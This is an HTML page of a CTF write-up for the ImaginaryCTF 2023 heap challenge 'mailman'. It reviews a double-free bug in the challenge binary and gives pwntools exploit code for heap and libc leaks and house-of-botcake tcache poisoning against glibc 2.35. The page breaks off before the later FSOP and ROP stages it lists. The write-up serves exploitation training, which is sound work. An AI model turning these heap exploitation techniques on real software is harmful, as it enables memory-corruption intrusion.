@@ -1,0 +1,389 @@
+<!DOCTYPE html>
+
+
+<html theme="dark" showBanner="true" hasBanner="true" > 
+<link href="/fontawesome/css/fontawesome.css" rel="stylesheet">
+<link href="/fontawesome/css/brands.css" rel="stylesheet">
+<link href="/fontawesome/css/solid.css" rel="stylesheet">
+<script src="/js/color.global.min.js" ></script>
+<script src="/js/load-settings.js" ></script>
+<head>
+  <meta charset="utf-8">
+  
+  
+  <title>[ImaginaryCTF 2023 - pwn] mailman | repr</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <meta name="description" content="mailman mailman (423 pts) - 31 solves by Eth007 Description I’m sure that my post office is 100% secure! It uses some of the latest software, unlike some of the other post offices out there…Flag is i">
+<meta property="og:type" content="article">
+<meta property="og:title" content="[ImaginaryCTF 2023 - pwn] mailman">
+<meta property="og:url" content="https://n4sm.github.io/posts/mailman/index.html">
+<meta property="og:site_name" content="repr">
+<meta property="og:description" content="mailman mailman (423 pts) - 31 solves by Eth007 Description I’m sure that my post office is 100% secure! It uses some of the latest software, unlike some of the other post offices out there…Flag is i">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://n4sm.github.io/pic/lovelive.jpg">
+<meta property="article:published_time" content="2023-07-23T22:00:00.000Z">
+<meta property="article:modified_time" content="2023-08-01T11:59:14.100Z">
+<meta property="article:author" content="nasm">
+<meta property="article:tag" content="ctf">
+<meta property="article:tag" content="nasm">
+<meta property="article:tag" content="pwn">
+<meta property="article:tag" content="heap">
+<meta property="article:tag" content="ImaginaryCTF">
+<meta property="article:tag" content="2023">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://n4sm.github.io/pic/lovelive.jpg">
+  
+    <link rel="alternate" href="/atom.xml" title="repr" type="application/atom+xml">
+  
+  
+    <link rel="icon" media="(prefers-color-scheme: light)" href="/images/favicon-light-32.png" sizes="32x32">
+    <link rel="icon" media="(prefers-color-scheme: light)" href="/images/favicon-light-128.png" sizes="128x128">
+    <link rel="icon" media="(prefers-color-scheme: light)" href="/images/favicon-light-180.png" sizes="180x180">
+    <link rel="icon" media="(prefers-color-scheme: light)" href="/images/favicon-light-192.png" sizes="192x192">
+    <link rel="icon" media="(prefers-color-scheme: dark)" href="/images/favicon-dark-32.png" sizes="32x32">
+    <link rel="icon" media="(prefers-color-scheme: dark)" href="/images/favicon-dark-128.png" sizes="128x128">
+    <link rel="icon" media="(prefers-color-scheme: dark)" href="/images/favicon-dark-180.png" sizes="180x180">
+    <link rel="icon" media="(prefers-color-scheme: dark)" href="/images/favicon-dark-192.png" sizes="192x192">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+<body>
+  
+  
+    
+<div id="banner" class="">
+  <img src="/pic/wall.png" itemprop="image">
+  <div id="banner-dim"></div>
+</div>
+ 
+   
+  <div id="main-grid" class="shadow   ">
+    <div id="nav" class=""  >
+      <navbar id="navbar">
+  <nav id="title-nav">
+    <a href="/">
+      <div id="vivia-logo">
+        <div class="dot"></div>
+        <div class="dot"></div>
+        <div class="dot"></div>
+        <div class="dot"></div>
+      </div>
+      <div>repr </div>
+    </a>
+  </nav>
+  <nav id="main-nav">
+    
+      <a class="main-nav-link" href="/">Home</a>
+    
+      <a class="main-nav-link" href="/archives">Archives</a>
+    
+      <a class="main-nav-link" href="/about">About</a>
+    
+  </nav>
+  <nav id="sub-nav">
+    <a id="theme-btn" class="nav-icon">
+      <span class="material-symbols-rounded light-mode-icon">wb_sunny</span>
+      <span class="material-symbols-rounded dark-mode-icon">dark_mode</span>
+    </a>
+    
+      <a id="nav-rss-link" class="nav-icon mobile-hide" href="/atom.xml" title="RSS Feed">
+        <span class="material-symbols-rounded rss">rss_feed</span>
+      </a>
+    
+    <a id="nav-search-btn" class="nav-icon" title="Search" style="display: none;">
+      <span class="material-symbols-rounded">search</span>
+    </a>
+    <div id="nav-menu-btn" class="nav-icon">
+      <span class="material-symbols-rounded">menu</span>
+    </div>
+  </nav>
+</navbar>
+<div id="nav-dropdown" class="hidden">
+  <div id="dropdown-link-list">
+    
+      <a class="nav-dropdown-link" href="/">Home</a>
+    
+      <a class="nav-dropdown-link" href="/archives">Archives</a>
+    
+      <a class="nav-dropdown-link" href="/about">About</a>
+    
+    
+      <a class="nav-dropdown-link" href="/atom.xml" title="RSS Feed">RSS</a>
+     
+    </div>
+</div>
+<script>
+  let dropdownBtn = document.getElementById("nav-menu-btn");
+  let dropdownEle = document.getElementById("nav-dropdown");
+  dropdownBtn.onclick = function() {
+    dropdownEle.classList.toggle("hidden");
+  }
+</script>
+    </div>
+    <div id="sidebar-wrapper">
+      <sidebar id="sidebar">
+  
+    <div class="widget-wrap">
+  <div class="info-card">
+    <div class="avatar">
+      
+        <image src=https://cdn.discordapp.com/attachments/755522926819934349/1135933820852502589/chtholly_nota_seniorious_by_asukaln_dfhx63b-414w-2x.jpg></image>
+      
+      <div class="img-dim"></div>
+    </div>
+    <div class="info">
+      <div class="username">nasm </div>
+      <div class="dot"></div>
+      <div class="subtitle">pwn / kernel stuff </div>
+      <div class="link-list">
+        
+          <a class="link-btn" target="_blank" rel="noopener" href="https://twitter.com/nasm_re" title="Twitter"><i class="fa-brands fa-twitter"></i></a>
+        
+          <a class="link-btn" target="_blank" rel="noopener" href="https://github.com/n4sm" title="GitHub"><i class="fa-brands fa-github"></i></a>
+        
+          <a class="link-btn" target="_blank" rel="noopener" href="https://ret2school.github.io/discord" title="Discord"><i class="fa-brands fa-discord"></i></a>
+         
+      </div>  
+    </div>
+  </div>
+</div>
+
+  
+  <div class="sticky">
+    
+      
+
+
+  <div class="widget-wrap">
+    <div class="widget">
+      <h3 class="widget-title">Categories</h3>
+      <div class="category-box">
+            <a class="category-link" href="/categories/pwn/">
+                pwn
+                <div class="category-count">19</div>
+            </a>
+        
+            <a class="category-link" href="/categories/kernel/">
+                kernel
+                <div class="category-count">3</div>
+            </a>
+        </div>
+    </div>
+  </div>
+
+
+    
+      
+  <div class="widget-wrap">
+    <div class="widget">
+      <h3 class="widget-title">Recent Posts</h3>
+      <ul>
+        
+          <a class="recent-link" href="/posts/iwindow/" title="[ImaginaryCTF 2023 - pwn] window-of-opportunity" >
+            <div class="recent-link-text">
+              [ImaginaryCTF 2023 - pwn] window-of-opportunity
+            </div>
+          </a>
+        
+          <a class="recent-link" href="/posts/mailman/" title="[ImaginaryCTF 2023 - pwn] mailman" >
+            <div class="recent-link-text">
+              [ImaginaryCTF 2023 - pwn] mailman
+            </div>
+          </a>
+        
+      </ul>
+    </div>
+  </div>
+
+    
+  </div>
+</sidebar>
+    </div>
+    <div id="content-body">
+       
+
+<article id="post-mailman" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  
+    
+   
+  <div class="article-inner">
+    <div class="article-main">
+      <header class="article-header">
+        
+<div class="main-title-bar">
+  <div class="main-title-dot"></div>
+  
+    
+      <h1 class="p-name article-title" itemprop="headline name">
+        [ImaginaryCTF 2023 - pwn] mailman
+      </h1>
+    
+  
+</div>
+
+        <div class='meta-info-bar'>
+          <div class="meta-info">
+  <time class="dt-published" datetime="2023-07-23T22:00:00.000Z" itemprop="datePublished">2023-07-24</time>
+</div>
+          <div class="need-seperator meta-info">
+            <div class="meta-cate-flex">
+  
+  <a class="meta-cate-link" href="/categories/pwn/">pwn</a>
+   
+</div>
+  
+          </div>
+          <div class="wordcount need-seperator meta-info">
+            2.3k words 
+          </div>
+        </div>
+        
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/2023/" rel="tag">2023</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ImaginaryCTF/" rel="tag">ImaginaryCTF</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctf/" rel="tag">ctf</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/heap/" rel="tag">heap</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/nasm/" rel="tag">nasm</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/pwn/" rel="tag">pwn</a></li></ul>
+
+      </header>
+      <div class="e-content article-entry" itemprop="articleBody">
+        
+          <p><img src="/../../pic/lovelive.jpg" alt="Love live qtness"></p>
+<h1 id="mailman"><a href="#mailman" class="headerlink" title="mailman"></a>mailman</h1><blockquote>
+<p>mailman (423 pts) - 31 solves by Eth007</p>
+<p>Description</p>
+<p>I’m sure that my post office is 100% secure! It uses some of the latest software, unlike some of the other post offices out there…<br>Flag is in .&#x2F;flag.txt.</p>
+<p>Attachments<br><a target="_blank" rel="noopener" href="https://imaginaryctf.org/r/PIxtO#vuln">https://imaginaryctf.org/r/PIxtO#vuln</a> <a target="_blank" rel="noopener" href="https://imaginaryctf.org/r/c9Mk8#libc.so.6">https://imaginaryctf.org/r/c9Mk8#libc.so.6</a> </p>
+<p>nc mailman.chal.imaginaryctf.org 1337</p>
+</blockquote>
+<p>mailman is a heap challenge I did for the <a target="_blank" rel="noopener" href="https://2023.imaginaryctf.org/">ImaginaryCTF 2023</a> event. It was a basic heap challenge involving tcache poisoning, safe-linking and seccomp bypass. You can find the related files <a target="_blank" rel="noopener" href="https://github.com/ret2school/ctf/tree/master/2023/imaginaryctf/pwn/mailman">there</a>.</p>
+<h2 id="TL-DR"><a href="#TL-DR" class="headerlink" title="TL;DR"></a>TL;DR</h2><ul>
+<li>Trivial heap and libc leak</li>
+<li>tcache poisoning to hiijack stdout</li>
+<li>FSOP on stdout to leak environ</li>
+<li>tcache poisoning on the fgets’s stackframe</li>
+<li>ROPchain that takes care of the seccomp</li>
+<li>PROFIT</li>
+</ul>
+<h2 id="Code-review"><a href="#Code-review" class="headerlink" title="Code review"></a>Code review</h2><p>First let’s take at the version of the libc and at the protections inabled onto the binary.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">$ checksec --file vuln </span><br><span class="line">[*] &#x27;/home/alexis/Documents/pwn/ImaginaryCTF/mailman/vuln&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br><span class="line">$ checksec --file libc.so.6 </span><br><span class="line">[*] &#x27;/home/alexis/Documents/pwn/ImaginaryCTF/mailman/libc.so.6&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br><span class="line">$ ./libc.so.6 </span><br><span class="line">GNU C Library (Ubuntu GLIBC 2.35-0ubuntu3.1) stable release version 2.35.</span><br><span class="line">Copyright (C) 2022 Free Software Foundation, Inc.</span><br><span class="line">This is free software; see the source for copying conditions.</span><br><span class="line">There is NO warranty; not even for MERCHANTABILITY or FITNESS FOR A</span><br><span class="line">PARTICULAR PURPOSE.</span><br><span class="line">Compiled by GNU CC version 11.2.0.</span><br><span class="line">libc ABIs: UNIQUE IFUNC ABSOLUTE</span><br><span class="line">For bug reporting instructions, please see:</span><br><span class="line">&lt;https://bugs.launchpad.net/ubuntu/+source/glibc/+bugs&gt;.</span><br><span class="line">$ seccomp-tools dump ./vuln</span><br><span class="line"> line  CODE  JT   JF      K</span><br><span class="line">=================================</span><br><span class="line"> 0000: 0x20 0x00 0x00 0x00000004  A = arch</span><br><span class="line"> 0001: 0x15 0x00 0x09 0xc000003e  if (A != ARCH_X86_64) goto 0011</span><br><span class="line"> 0002: 0x20 0x00 0x00 0x00000000  A = sys_number</span><br><span class="line"> 0003: 0x35 0x00 0x01 0x40000000  if (A &lt; 0x40000000) goto 0005</span><br><span class="line"> 0004: 0x15 0x00 0x06 0xffffffff  if (A != 0xffffffff) goto 0011</span><br><span class="line"> 0005: 0x15 0x04 0x00 0x00000000  if (A == read) goto 0010</span><br><span class="line"> 0006: 0x15 0x03 0x00 0x00000001  if (A == write) goto 0010</span><br><span class="line"> 0007: 0x15 0x02 0x00 0x00000002  if (A == open) goto 0010</span><br><span class="line"> 0008: 0x15 0x01 0x00 0x00000005  if (A == fstat) goto 0010</span><br><span class="line"> 0009: 0x15 0x00 0x01 0x0000003c  if (A != exit) goto 0011</span><br><span class="line"> 0010: 0x06 0x00 0x00 0x7fff0000  return ALLOW</span><br><span class="line"> 0011: 0x06 0x00 0x00 0x00000000  return KILL</span><br></pre></td></tr></table></figure>
+
+<p>Full prot for the binary and classic partial RELRO for the already up-to-date libc. The binary loads a seccomp that allows only the read, write, open, fstat and exit system calls.</p>
+<p>By reading the code in IDA the main looks like this:</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl __noreturn <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">void</span> *v3; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// [rsp+Ch] [rbp-24h] BYREF</span></span><br><span class="line">  <span class="type">size_t</span> size; <span class="comment">// [rsp+10h] [rbp-20h] BYREF</span></span><br><span class="line">  __int64 v6; <span class="comment">// [rsp+18h] [rbp-18h]</span></span><br><span class="line">  __int64 v7; <span class="comment">// [rsp+20h] [rbp-10h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v8; <span class="comment">// [rsp+28h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v8 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  v6 = seccomp_init(<span class="number">0LL</span>, argv, envp);</span><br><span class="line">  seccomp_rule_add(v6, <span class="number">2147418112LL</span>, <span class="number">2LL</span>, <span class="number">0LL</span>);</span><br><span class="line">  seccomp_rule_add(v6, <span class="number">2147418112LL</span>, <span class="number">0LL</span>, <span class="number">0LL</span>);</span><br><span class="line">  seccomp_rule_add(v6, <span class="number">2147418112LL</span>, <span class="number">1LL</span>, <span class="number">0LL</span>);</span><br><span class="line">  seccomp_rule_add(v6, <span class="number">2147418112LL</span>, <span class="number">5LL</span>, <span class="number">0LL</span>);</span><br><span class="line">  seccomp_rule_add(v6, <span class="number">2147418112LL</span>, <span class="number">60LL</span>, <span class="number">0LL</span>);</span><br><span class="line">  seccomp_load(v6);</span><br><span class="line">  setbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>);</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Welcome to the post office.&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Enter your choice below:&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;1. Write a letter&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;2. Send a letter&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;3. Read a letter&quot;</span>);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;&gt; &quot;</span>);</span><br><span class="line">      __isoc99_scanf(<span class="string">&quot;%d%*c&quot;</span>, &amp;v4);</span><br><span class="line">      <span class="keyword">if</span> ( v4 != <span class="number">3</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      v7 = inidx();</span><br><span class="line">      <span class="built_in">puts</span>(*((<span class="type">const</span> <span class="type">char</span> **)&amp;mem + v7));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v4 &gt; <span class="number">3</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">if</span> ( v4 == <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v7 = inidx();</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;letter size: &quot;</span>);</span><br><span class="line">      __isoc99_scanf(<span class="string">&quot;%lu%*c&quot;</span>, &amp;size);</span><br><span class="line">      v3 = <span class="built_in">malloc</span>(size);</span><br><span class="line">      *((_QWORD *)&amp;mem + v7) = v3;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;content: &quot;</span>);</span><br><span class="line">      fgets(*((<span class="type">char</span> **)&amp;mem + v7), size, <span class="built_in">stdin</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v4 != <span class="number">2</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      v7 = inidx();</span><br><span class="line">      <span class="built_in">free</span>(*((<span class="type">void</span> **)&amp;mem + v7));</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Invalid choice!&quot;</span>);</span><br><span class="line">  _exit(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>The program allows to create a chunk of any size, filling it with user-supplied input with fgets. We can print its content or free it. The bug lies in the free handler that doesn’t check if a chunk has already been free’d.</p>
+<h1 id="Exploitation"><a href="#Exploitation" class="headerlink" title="Exploitation"></a>Exploitation</h1><p>Before bypassing the seccomp we need to get code execution, to do so I will use the very classic exploitation flow: <code>FSOP stdout to leak environ</code> &#x3D;&gt; <code>ROPchain</code>. I could have used an <a target="_blank" rel="noopener" href="https://blog.kylebot.net/2022/10/22/angry-FSROP/">angry FSOP</a> to directly get code execution by hijjacking the vtable used by the wide operations in stdout, given actually it is not checked against a specific address range as it is the case for the <code>_vtable</code>. To get code execution, we need to get the heap and libc base addresses.</p>
+<h2 id="Heap-and-libc-leak"><a href="#Heap-and-libc-leak" class="headerlink" title="Heap and libc leak"></a>Heap and libc leak</h2><p>To get a heap leak we can simply do defeat safe-linking:</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># leak</span></span><br><span class="line"></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">view(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">heap = ((pwn.u64(io.recvline()[:-<span class="number">1</span>].ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>)) &lt;&lt; <span class="number">12</span>) - <span class="number">0x2000</span>)</span><br><span class="line">pwn.log.info(<span class="string">f&quot;heap @ <span class="subst">&#123;<span class="built_in">hex</span>(heap)&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure>
+
+<p>To get an arbitrary read &#x2F; write I used the house of botcake technique. I already talked about it more deeply <a target="_blank" rel="noopener" href="https://nasm.re/posts/catastrophe/#house-of-botcake">there</a>. During this house I put a chunk in the unsortedbin, leaking the libc:</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0</span>, <span class="number">0x100</span>, <span class="string">b&quot;YY&quot;</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">7</span>, <span class="number">0x100</span>, <span class="string">b&quot;YY&quot;</span>) <span class="comment"># prev</span></span><br><span class="line">add(<span class="number">8</span>, <span class="number">0x100</span>, <span class="string">b&quot;YY&quot;</span>) <span class="comment"># a</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># fill tcache</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    free(i)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">20</span>):</span><br><span class="line">    add(<span class="number">9</span>, <span class="number">0x10</span>, <span class="string">b&quot;/bin/sh\0&quot;</span>) <span class="comment"># barrier</span></span><br><span class="line"></span><br><span class="line">free(<span class="number">8</span>) <span class="comment"># free(a) =&gt; unsortedbin</span></span><br><span class="line">free(<span class="number">7</span>) <span class="comment"># free(prev) =&gt; merged with a</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># leak libc</span></span><br><span class="line">view(<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">libc.address = pwn.u64(io.recvline()[:-<span class="number">1</span>].ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>)) - <span class="number">0x219ce0</span> <span class="comment"># offset of the unsorted bin</span></span><br><span class="line">pwn.log.success(<span class="string">f&quot;libc: <span class="subst">&#123;<span class="built_in">hex</span>(libc.address)&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure>
+
+<h2 id="House-of-botcake-for-the-win"><a href="#House-of-botcake-for-the-win" class="headerlink" title="House of botcake for the win"></a>House of botcake for the win</h2><p>The house of botcake is very easy to understand, it is useful when you can trigger some double free bug. It is basically:</p>
+<ul>
+<li>Allocate 7 0x100 sized chunks to then fill the tcache (7 entries).</li>
+<li>Allocate two more 0x100 sized chunks (prev and a in the example).</li>
+<li>Allocate a small “barrier” 0x10 sized chunk.</li>
+<li>Fill the tcache by freeing the first 7 chunks.</li>
+<li>free(a), thus a falls into the unsortedbin.</li>
+<li>free(prev), thus prev is consolidated with a to create a large 0x221 sized chunk that is remains in the unsortedbin.</li>
+<li>Request one more 0x100 sized chunk to let a single entry available in the tcache.</li>
+<li>free(a) again, given a is part of the large 0x221 sized chunk it leads to an UAF. Thus a falls into the tcache.</li>
+<li>That’s finished, to get a write what where we just need to request a 0x130 sized chunk. Thus we can hiijack the next fp of a that is currently referenced by the tcache by the location we wanna write to. And next time two 0x100 sized chunks are requested, the second one will be the target location.</li>
+</ul>
+<p>Which gives:</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    add(i, <span class="number">0x100</span>, <span class="string">b&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># leak</span></span><br><span class="line"></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">view(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">heap = ((pwn.u64(io.recvline()[:-<span class="number">1</span>].ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>)) &lt;&lt; <span class="number">12</span>) - <span class="number">0x2000</span>)</span><br><span class="line">pwn.log.info(<span class="string">f&quot;heap @ <span class="subst">&#123;<span class="built_in">hex</span>(heap)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>, <span class="number">0x100</span>, <span class="string">b&quot;YY&quot;</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">7</span>, <span class="number">0x100</span>, <span class="string">b&quot;YY&quot;</span>) <span class="comment"># prev</span></span><br><span class="line">add(<span class="number">8</span>, <span class="number">0x100</span>, <span class="string">b&quot;YY&quot;</span>) <span class="comment"># a</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># fill tcache</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    free(i)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">20</span>):</span><br><span class="line">    add(<span class="number">9</span>, <span class="number">0x10</span>, <span class="string">b&quot;/bin/sh\0&quot;</span>) <span class="comment"># barrier</span></span><br><span class="line"></span><br><span class="line">free(<span class="number">8</span>) <span class="comment"># free(a) =&gt; unsortedbin</span></span><br><span class="line">free(<span class="number">7</span>) <span class="comment"># free(prev) =&gt; merged with a</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># leak libc</span></span><br><span class="line">view(<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">libc.address = pwn.u64(io.recvline()[:-<span class="number">1</span>].ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>)) - <span class="number">0x219ce0</span> <span class="comment"># offset of the unsorted bin</span></span><br><span class="line">pwn.log.success(<span class="string">f&quot;libc: <span class="subst">&#123;<span class="built_in">hex</span>(libc.address)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">stdout = libc.address + <span class="number">0x21a780</span></span><br><span class="line">environ = libc.address + <span class="number">0x2a72d0</span> + <span class="number">8</span></span><br><span class="line">strr = libc.address + <span class="number">0x1bd460</span></span><br><span class="line"></span><br><span class="line">pwn.log.success(<span class="string">f&quot;environ: <span class="subst">&#123;<span class="built_in">hex</span>(environ)&#125;</span>&quot;</span>)</span><br><span class="line">pwn.log.success(<span class="string">f&quot;stdout: <span class="subst">&#123;<span class="built_in">hex</span>(stdout)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>, <span class="number">0x100</span>, <span class="string">b&quot;YY&quot;</span>) <span class="comment"># pop a chunk from the tcache to let an entry left to a </span></span><br><span class="line">free(<span class="number">8</span>) <span class="comment"># free(a) =&gt; tcache</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># unsortedbin =&gt; oob on a =&gt; tcache poisoning</span></span><br><span class="line">add(<span class="number">1</span>, <span class="number">0x130</span>, <span class="string">b&quot;T&quot;</span>*<span class="number">0x108</span> + pwn.p64(<span class="number">0x111</span>) + pwn.p64(((stdout) ^ ((heap + <span class="number">0x2b90</span>) &gt;&gt; <span class="number">12</span>))))</span><br><span class="line">add(<span class="number">2</span>, <span class="number">0x100</span>, <span class="string">b&quot;TT&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># tcache =&gt; stdout</span></span><br></pre></td></tr></table></figure>
+
